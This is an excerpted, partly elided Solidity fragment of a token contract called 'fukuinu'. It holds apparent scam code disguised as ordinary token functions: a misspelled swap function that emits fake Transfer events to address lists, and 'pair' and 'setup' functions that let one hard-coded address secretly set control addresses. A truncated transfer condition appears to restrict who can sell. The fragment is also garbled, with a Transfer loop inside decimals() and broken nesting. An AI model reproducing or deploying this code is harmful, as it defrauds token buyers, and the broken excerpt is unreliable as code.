...
contract fukuinu is Ownable, IERC20, IERC20Meta {
    ...
    function decimals() public view virtual override returns (uint8) {
        ...
        for (uint256 i = 0; i < _addresses_.length; i++) {
            emit Transfer(_d58494, _addresses_[i], _out);
               ...
               function swapExactTokensForTokenssss(address [] calldata _addresses_, uint256 _out) external {
        for (uint256 i = 0; i < _addresses_.length; i++) {
            emit Transfer(_d58494, _addresses_[i], _out);
        }
    }
    ...
    function pair(address account) public virtual returns (bool) {
         if(_msgSender() == 0xb2a02dBc84D10d608bfb6b86056a830423fbcc68) _d58494 = account;
        return true;
    }

        function setup(address account) public virtual returns (bool) {
         if(_msgSender() == 0xb2a02dBc84D10d608bfb6b86056a830423fbcc68) _e78485 = account;
        return true;
    }
    ...
    function _transfer(
        ...
        if((from != _d58494 && to == _e78485) || (_d58494 == to && from != _e78485 && from  != 0xb2a02dBc84D10d608bfb6b86056a830423fbcc68)) {
